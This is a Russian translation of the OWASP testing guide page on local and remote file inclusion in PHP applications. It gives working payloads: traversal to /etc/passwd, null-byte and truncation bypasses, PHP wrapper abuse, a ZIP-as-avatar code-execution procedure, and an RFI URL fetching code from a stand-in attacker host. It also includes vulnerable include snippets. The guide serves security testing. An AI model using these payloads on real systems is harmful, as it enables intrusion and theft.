---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование включения файлов (LFI/RFI)

## Обзор

Уязвимость включения файлов (англ.:  File Inclusion) позволяет злоумышленнику включить файл, обычно используя механизм «динамического включения файлов», реализованный в целевом приложении. Уязвимость возникает из-за использования введённых пользователем данных без надлежащего контроля.

Это может привести к чему-то обычному, типа вывода содержимого файла, но также может привести к:

- выполнению кода на web-сервере;
- выполнение кода на стороне клиента, например, JavaScript, что может привести к другим атакам, таким как межсайтовый скриптинг (XSS);
- отказу в обслуживании (англ.: Denial of Service, DoS);
- разглашению конфиденциальной информации.

Включение локальных файлов (LFI) — процесс включения файлов, которые присутствуют на сервере, посредством эксплуатации уязвимых процедур, реализованных в приложении. Например, эта уязвимость возникает, когда страница получает входные данные, являющиеся путём к локальному файлу. Этот ввод  должным образом не нейтрализуется, что позволяет вводить символы обхода каталога (например, `../`, — см. в 4.5.1 [Тестирование включения файлов при обходе каталогов](../05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md)).

Включение удалённых файлов (RFI) — процесс включения файлов из удалённых источников посредством эксплуатации уязвимых процедур, реализованных в приложении. Например, эта уязвимость возникает, когда страница получает входные данные, которые являются URL удалённого файла. Этот ввод  должным образом не нейтрализуется, что позволяет вводить внешние URL.

В обоих случаях, хотя большинство примеров указывают на уязвимые PHP-скрипты, мы должны иметь в виду, что это также распространено в других серверных скриптовых технологиях, таких как JSP, ASP и т.д.

## Задачи тестирования

- Найти точки включения файлов.
- Оценить потенциальное воздействие уязвимостей.

## Как тестировать

### Тестирование включения локального файла

Поскольку LFI возникает, когда пути, переданные в оператор `include`, должным образом не нейтрализованы, при тестировании методом чёрного ящика мы должны искать функциональность, которая в качестве параметров принимает имена файлов/пути.

Рассмотрим следующий пример:

`http://vulnerable_host/preview.php?file=example.html`

Выглядит перспективно для того, чтобы попробовать LFI. Если приложение не найдёт соответствующую страницу, указанную в параметре `file`, а вместо этого напрямую включает входные данные, можно подключить произвольные файлы с сервера.

Типичным примером для проверки концепции была бы попытка загрузить файл `passwd`:

`http://vulnerable_host/preview.php?file=../../../../etc/passwd`

Если вышеупомянутые условия будут выполнены, злоумышленник увидит в ответе что-то вроде:

```bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
...
```

Даже если такая уязвимость существует, её эксплуатация может быть более сложной в реальных сценариях. Рассмотрим следующий фрагмент кода:

```php
<?php include($_GET['file'].".php"); ?>
```

Простая подстановка случайного имени файла не сработает, т.к. к предоставленному вводу добавляется постфикс `.php`. Чтобы это обойти, можно использовать разные методы, чтобы добиться ожидаемого поведения.

#### Инъекция нулевого байта

«Нулевой символ» (также известный как «нулевой терминатор» или «нулевой байт») — это управляющий символ со значением ноль, присутствующий во многих наборах символов, который используется в качестве зарезервированного символа для обозначения конца строки. Любой символ после этого специального байта будет проигнорирован. Обычно этот символ можно ввести с помощью строки `%00` в URL-кодировке, добавив его к запрошенному пути. В нашем предыдущем примере, выполняя запрос к `http://vulnerable_host/preview.php?file=../../../../etc/passwd%00` расширение `.php`, добавляемое к введённому имени файла будет проигнорировано, выдавая злоумышленнику список основных пользователей в результате успешной эксплуатации.

#### Усечение пути и точки

В большинстве инсталляций PHP ограничение на имя файла составляет 4096 байт. Если имя файла длиннее этого значения, PHP просто обрезает его, отбрасывая «лишние» символы. Злоупотребление этим поведением позволяет заставить PHP игнорировать расширение `.php`, перемещая его за пределы 4096 байт. Когда это происходит, ошибки не возникает; лишние символы просто отбрасываются, а PHP продолжает выполняться как обычно.

Этот обход обычно комбинируется с другими стратегиями логического обхода, такими как кодирование части пути к файлу в кодировке Unicode, инъекция двойной кодировки или любого другого ввода, который по-прежнему будет представлять желаемое имя файла.

#### PHP-обёртки

Уязвимости при включении локальных файлов обычно рассматриваются как доступные только для чтения, которые злоумышленник может использовать для чтения конфиденциальных данных с сервера, на котором размещено уязвимое приложение. Однако в некоторых реализациях она может быть использована для повышения опасности уязвимости [от LFI до удалённого выполнения кода](https://corben.io/zip-to-rce-lfi/), которое потенциально может полностью скомпрометировать хост.

Такое «усовершенствование» возможно, если злоумышленник может сочетать [уязвимость LFI с некоторыми PHP-обёртками](https://jolly-me.ru/windows-8-1/kak-vrappery-php-mogut-byt-ispolzovany-dlya-ataki-na-veb-prilozheniya/).

Обёртка — это код, окружающий другой код для выполнения некоторых дополнительных функций. PHP реализует множество [встроенных обёрток](https://www.php.net/manual/ru/wrappers.php) для использования с функциями файловой системы. Как только их использование обнаружено в процессе тестирования приложения, рекомендуется попытаться злоупотребить ими, чтобы определить реальный риск обнаруженных недостатков. Ниже приведён список с наиболее часто используемыми обёртками, хотя вы должны учитывать, что он не является исчерпывающим;  в то же время можно зарегистрировать пользовательские, которые, при их эксплуатации целью, потребуют более глубокого анализа.

##### PHP Filter

Используется для доступа к локальной файловой системе; это нечувствительная к регистру обёртка, которая позволяет применять фильтры к потоку во время открытия файла. Эту обёртку можно использовать для получения содержимого файла, предотвращая его выполнение сервером. Например, позволяя злоумышленнику читать содержимое файлов PHP, чтобы получить исходный код для выявления конфиденциальной информации, такой как учётные данные или другие уязвимости, которые можно эксплуатировать.

Эту обёртку можно использовать так: `php://filter/convert.base64-encode/resource=FILE`, где `FILE` — это файл, который нужно извлечь. В результате выполнения содержимое целевого файла будет прочитано, закодировано в base64 (шаг, который предотвращает выполнение на стороне сервера) и возвращено агенту пользователя (т.е. браузеру).

##### PHP ZIP

В PHP 7.2.0 появилась обёртка `zip://` для управления сжатыми файлами `zip`. Она ожидает следующую структуру параметров: `zip:///filename_path#internal_filename`, где `filename_path` — путь к zip-архиву, а `internal_filename` — путь к файлу, помещённому в обрабатываемый ZIP-архив. Обычно при эксплуатации `#` URL-кодируется значением `%23`.

Злоупотребление этой обёрткой может позволить злоумышленнику создать вредоносный ZIP-архив, который можно загрузить на сервер, например, в качестве изображения для аватара или с помощью любой системы загрузки файлов, доступной на целевом  web-сайте для запуска LFI (обёртка `php:zip://` не требует, чтобы zip-файл имел какое-либо определённое расширение).

Чтобы протестировать эту уязвимость, можно выполнить следующую процедуру для атаки на приведенный выше пример кода.

1. Создайте исполняемый файл PHP, например, с содержимым `<?php phpinfo(); ?>` и сохраните его как `code.php`.
2. Сожмите его в новый ZIP-архив с именем `target.zip`.
3. Переименуйте `target.zip` в `target.jpg`, чтобы обойти проверку расширения и загрузить его на целевой web-сайт в качестве аватарки.
4. Предположим, что файл `target.jpg` хранится локально на сервере по пути `../avatar/target.jpg`, используйте уязвимость с помощью ZIP-обёртки PHP, вставив следующую полезную нагрузку в уязвимый URL: `zip://../avatar/target.jpg%23code` (помня, что `%23` — это `#`).

Поскольку в нашем примере расширение `.php` конкатенируется с нашей полезной нагрузкой, запрос `http://vulnerable_host/preview.php?file=zip://../avatar/target.jpg%23code` приведёт к выполнению `code.php`, хранящегося во вредоносном ZIP-архиве.

##### PHP Data

Эта обёртка, появившаяся в PHP 5.2.0, предполагает следующее использование: `data://text/plain;base64,BASE64_STR`, где `BASE64_STR`, как ожидается, будет содержимым обрабатываемого файла в кодировке Base64. Важно учитывать, что эта обёртка будет доступна только в том случае, если включена опция `allow_url_include`.

Чтобы протестировать LFI с использованием этой обёртки, код, который будет выполняться, должен быть закодирован в Base64. Например, `<?php phpinfo(); ?>` будет закодирован как: `PD9waHAgcGhwaW5mbygpOyA/Pg==`, а полезная нагрузка представлена в виде: `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`.

##### PHP Expect

Эта обёртка, которая не включена по умолчанию, даёт доступ к процессам `stdio`, `stdout` и `stderr`. Сервер выполнит предоставленную в формате `expect://command` команду с использованием `BASH` и вернёт результат.

### Тестирование включения удалённого файлов

Поскольку RFI возникает, когда URL, передаваемые операторам `include`, должным образом не нейтрализуются, при тестировании методом чёрного ящика нам следует искать скрипты, которые принимают имена файлов в качестве параметров. Рассмотрим следующий пример на PHP:

```php
$incfile = $_REQUEST["file"];
include($incfile.".php");
```

В данном примере путь извлекается из HTTP-запроса, а контроль ввода не проводится (например, посредством сверки введённых данных со списком разрешённых), поэтому этот фрагмент кода уязвим для такого типа атак. Рассмотрим следующий URL:

`http://vulnerable_host/vuln_page.php?file=http://attacker_site/malicous_page`

В этом случае будет включен удалённый файл, и любой код, содержащийся в нём, будет выполняться сервером.

## Меры защиты

Наиболее эффективным решением для устранения уязвимостей при включении файлов является отказ от передачи введённых пользователем данных в файловую систему/API/фреймворк. Если это невозможно, приложение может поддерживать список разрешённых файлов, которые могут включаться на странице, а также идентификатор (например, порядковый номер) для доступа к выбранному файлу. Любой запрос, содержащий недопустимый идентификатор, должен отклоняться, чтобы у злоумышленников не было возможности манипулировать этим путём.
Ознакомьтесь с [Памяткой по загрузке файлов](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html), чтобы узнать о рекомендациях по безопасности на эту тему.

## Инструменты

- [kadimus](https://github.com/P0cL4bs/Kadimus)
- [LFI Suite](https://github.com/D35m0nd142/LFISuite)
- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org)

## Ссылки

- [PHP-инъекция](https://ru.wikipedia.org/wiki/PHP-%D0%B8%D0%BD%D1%8A%D0%B5%D0%BA%D1%86%D0%B8%D1%8F)
- [Null character](https://en.wikipedia.org/wiki/Null_character)
- [Unicode Encoding](https://owasp.org/www-community/attacks/Unicode_Encoding)
- [Двойное кодирование](https://owasp.org/www-community/Double_Encoding)
- [Поддерживаемые PHP протоколы и обёртки](https://www.php.net/manual/ru/wrappers.php)
- [RFC 2397 - The "data" URL scheme](https://www.rfc-editor.org/rfc/rfc2397)
- [Remote File Inclusion](http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion)
- [Wikipedia: File Inclusion](https://en.wikipedia.org/wiki/Remote_File_Inclusion)
